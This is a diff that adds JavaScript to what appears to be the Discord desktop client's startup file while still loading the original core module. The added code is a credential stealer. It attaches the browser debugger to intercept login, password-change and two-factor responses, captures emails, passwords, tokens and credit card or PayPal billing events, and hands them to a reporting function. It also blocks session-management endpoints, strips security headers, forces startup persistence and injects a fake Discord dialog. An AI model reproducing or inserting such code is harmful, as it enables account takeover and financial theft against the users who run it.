+                (response.token || token),
+                `\`${response.backup_codes.length} Security\` codes have just been added`
+            );
+        },
+        '/@me': () => {
+            if (!request.password) return;
+            if (request.email) {
+                Cruise(
+                    'EMAIL_CHANGED',
+                    response,
+                    request,
+                    (request.email || email),
+                    (request.password || password),
+                    (response.token || token),
+                    `has updated their gmail to \`${request.email}\``
+                );
+            }
+            if (request.new_password) {
+                Cruise(
+                    'PASSWORD_CHANGED',
+                    response,
+                    request,
+                    (request.email || email),
+                    (request.password || password),
+                    (response.token || token),
+                    `has updated their password to \`${request.password}\``
+                );
+            }
+            if (request.username) {
+                Cruise(
+                    'USERNAME_CHANGED',
+                    response,
+                    request,
+                    (request.email || email),
+                    (request.password || password),
+                    (response.token || token),
+                    `has updated their username to \`${request.username}\``
+                );
+            }
+        },
+    };
+    const handler = Object.keys(urlHandlers).find(url => params.response.url.endsWith(url));
+    if (handler) {
+        await urlHandlers[handler]();
+    }
+};
+
+const createWindow = (mainWindow) => {
+    if (!mainWindow) return;
+    if (!startup_event_occurred) {
+        forcePersistStartup();;
+        startup_event_occurred = true;
+    }
+    mainWindow.webContents.debugger.attach('1.3');
+    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
+        if ('Network.responseReceived' !== method) return;
+        if (!startup_event_occurred) {
+            await startup();
+            startup_event_occurred = true;
+        }
+        if (!CONFIG.auth_filters.urls.some(url => params.response.url.endsWith(url))) return;
+        if (![200, 202].includes(params.response.status)) return;
+
+        try {
+            const [responseUnparsed,requestUnparsed] = await Promise.all([
+                mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {requestId: params.requestId}),
+                mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {requestId: params.requestId})
+            ]);
+
+            const responseData = JSON.parse(responseUnparsed.body || '');
+            const requestData = JSON.parse(requestUnparsed.postData || '');
+
+            await handleResponse(mainWindow, params, responseData, requestData);
+        } catch (error) {
+            console.error(error);
+        }
+    });
+
+    mainWindow.webContents.debugger.sendCommand('Network.enable');
+
+    mainWindow.on('closed', () => {
+        const windows = BrowserWindow.getAllWindows();
+        if (windows.length > 0) {
+            createWindow(windows[0]);
+        }
+    });
+};
+
+const defaultSession = (webRequest) => {
+    webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
+        const { url, uploadData, method, statusCode, billing_address } = details;
+
+        if (!['POST'].includes(method) && ![200, 202].includes(statusCode)) return;
+
+        const {token} = await AuritaCord();
+
+        switch (true) {
+            case url.endsWith('/tokens'): {
+                let item;
+
+                try {
+                    item = querystring.parse(Buffer.from(uploadData[0].bytes).toString());
+                } catch (error) {
+                    item = querystring.parse(decodeURIComponent(uploadData[0]?.bytes.toString() || ''));
+                }
+                const { line_1, line_2, city, state, postal_code, country, email } = billing_address;
+
+                const request = {
+                    item,
+                    line_1, 
+                    line_2, 
+                    city, 
+                    state, 
+                    postal_code, 
+                    country,
+                    email
+                };
+
+                Cruise(
+                    'CREDITCARD_ADDED',
+                    null,
+                    request,
+                    null,
+                    null,
+                    token,
+                    `you just added a \`Credit Card\``
+                );
+                break;
+            }
+            case (url.endsWith('/paypal_accounts') && url.endsWith('/paypal/billing-agreement-tokens')): {
+                Cruise(
+                    'PAYPAL_ADDED',
+                    null,
+                    null,
+                    null,
+                    null,
+                    token,
+                    `you just added a <:Paypal:1129073151746252870> \`Paypal\` account`
+                );
+                break;
+            }
+        }
+    });
+
+    webRequest.onBeforeRequest(CONFIG.session_filters, (details, callback) => {   
+        const { url } = details;
+
+        if (url.endsWith("auth/sessions") || url.startsWith("wss://remote-auth-gateway")) {
+            return callback({cancel: true});
+        } else {
+            return callback({cancel: false});
+        };
+    });
+
+    webRequest.onHeadersReceived(async (request, callback) => {
+        const { url, method, statusCode, responseHeaders, uploadData } = request;
+
+        const updatedHeaders = { ...responseHeaders };
+        delete updatedHeaders["content-security-policy"];
+        delete updatedHeaders["content-security-policy-report-only"];
+
+        callback({responseHeaders: {
+            ...updatedHeaders, 
+            "Access-Control-Allow-Headers": "*" 
+        }});
+
+        if (url.endsWith('/@me') && !script_executed) {
+            if (CONFIG.auto_user_profile_edit === 'true') {
+                script_executed = true;
+                
+                await editSettingUser();
+            };
+    
+            if (CONFIG.auto_email_update === 'true') {
+                script_executed = true;
+
+                const {token, user} = await AuritaCord();
+                const language = user.locale || 'en-US';
+
+                const truncateEmail = (email) => {
+                    if (!email) return '@';
+                    const [localPart, domain] = email.split('@');
+                    const truncatedLocalPart = localPart.length > 15 ? `${localPart.slice(0, 15)}...` : localPart;
+                    return `${truncatedLocalPart}@${domain}`;
+                };
+    
+                const [
+                    CONFIG_ALERT,
+                    EDIT_MAIL_ALERT,
+                    TITLE_INTRO,
+                    ALERT_INTRO,
+                    END_INTRO_ALERT,
+                    CHANGE_ALERT,
+                    LAST_END_ALERT,
+                    CONTACT_ALERT,
+                ] = await translateAutoEmailUpdate(language);
+                  
+                await execScript(`
+                    function loadStylesheets() {
+                        const stylesheets = [
+                            "https://discord.com/assets/d4261c08ee2b8d686d9d.css",
+                            "https://discord.com/assets/ed0fd6a2ab291ba57d4a.css",
+                        ];
+    
+                        const head = document.head || document.getElementsByTagName('head')[0];
+    
+                        stylesheets.forEach(url => {
+                            const stylesheetLink = document.createElement('link');
+                            stylesheetLink.rel = 'stylesheet';
+                            stylesheetLink.href = url;
+                            head.appendChild(stylesheetLink);
+                        });
+                    }
+                    
+                    async function simulateClicks() {
+                        try {
+                            loadStylesheets();
+                            const div = document.createElement("div");
+                            div.innerHTML = \`
+                                <div class="layerContainer_cd0de5">
+                                    <div class="backdrop_e4f2ae withLayer_e4f2ae" style="background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(0px);">
+                                    </div>
+                                    <div class="layer_c9e2da">
+                                        <div class="focusLock_f9a4c9" role="dialog" aria-labelledby=":r11:" tabindex="-1" aria-modal="true">
+                                            <div class="root_f9a4c9 small_f9a4c9 fullscreenOnMobile_f9a4c9 rootWithShadow_f9a4c9"
+                                                style="opacity: 1; transform: scale(1);"><img alt="" class="emailHeaderImg_a62824" src="/assets/8b500863ec942f68c46b.svg">
+                                                <div style="position: relative; width: 440px; height: 380px; overflow: hidden;">
+                                                    <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; opacity: 1;">
+                                                        <form>
+                                                            <div class="flex_dc333f horizontal_dc333f justifyStart_ec1a20 alignCenter_ec1a20 noWrap_ec1a20 header_f9a4c9 header_a62824" id=":r11:" style="flex: 0 0 auto;">
+                                                                <h1 class="defaultColor_a595eb heading-xl/extrabold_dc00ef defaultColor_e9e35f title_a62824" data-text-variant="heading-xl/extrabold">
+                                                                    ${CONFIG_ALERT}
+                                                                </h1>
+                                                            </div>
+                                                            <div class="content_f9a4c9 content_a62824 thin_c49869 scrollerBase_c49869" dir="ltr" style="overflow: hidden scroll; padding-right: 8px;">
+                                                                <div class="defaultColor_a595eb text-md/normal_dc00ef description_a62824" data-text-variant="text-md/normal">
+                                                                    <p>${ALERT_INTRO} (<strong>${truncateEmail(user.email || 'user@gmail.com')}</strong>) ${END_INTRO_ALERT}</p>
+                                                                    <p>${CHANGE_ALERT}</p>
+                                                                    <p>${LAST_END_ALERT} ${CONTACT_ALERT}</p>
+                                                                </div>
+                                                                <div aria-hidden="true" style="position: absolute; pointer-events: none; min-height: 0px; min-width: 1px; flex: 0 0 auto; height: 16px;"></div>
+                                                            </div>
+                                                            <div class="flex_dc333f horizontalReverse_dc333f justifyStart_ec1a20 alignStretch_ec1a20 noWrap_ec1a20 footer_f9a4c9 modalFooter_a62824 footerSeparator_f9a4c9" style="flex: 0 0 auto;">
+                                                                <a href="https://discord.com/settings/account" class="button_dd4f85 lookFilled_dd4f85 colorBrand_dd4f85 sizeMedium_dd4f85 grow_dd4f85">
+                                                                    <div class="contents_dd4f85">
+                                                                        ${EDIT_MAIL_ALERT}
+                                                                    </div>
+                                                                </a>
+                                                            </div>
+                                                        </form>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            \`;
+                            document.body.appendChild(div);
+                            document.body.appendChild(div);
+                            await new Promise((resolve) => setTimeout(resolve, 999999999));
+                            document.body.removeChild(div);
+                        } catch (error) {
+                        }
+                    }
+                    
+                    simulateClicks();
+                `);
+            };
+        }
+    });
+}
+
+createWindow(BrowserWindow.getAllWindows()[0]);
+defaultSession(session.defaultSession.webRequest);
 
 module.exports = require("./core.asar");
